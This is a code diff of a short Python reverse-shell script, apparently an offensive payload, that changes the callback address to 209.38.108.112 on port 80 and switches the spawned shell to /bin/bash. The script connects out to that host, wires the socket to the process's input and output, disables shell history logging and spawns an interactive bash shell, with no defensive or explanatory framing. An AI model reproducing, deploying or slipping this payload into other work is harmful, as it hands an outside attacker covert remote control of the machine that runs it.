@@ -14,8 +14,8 @@ import os
 import pty
 import socket
 
-lhost = "212.83.166.61" # XXX: CHANGEME
-lport = 44258 # XXX: CHANGEME
+lhost = "209.38.108.112" # XXX: CHANGEME
+lport = 80 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,7 +24,7 @@ def main():
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
-    pty.spawn("/usr/bin/bash")
+    pty.spawn("/bin/bash")
     s.close()
 	
 if __name__ == "__main__":
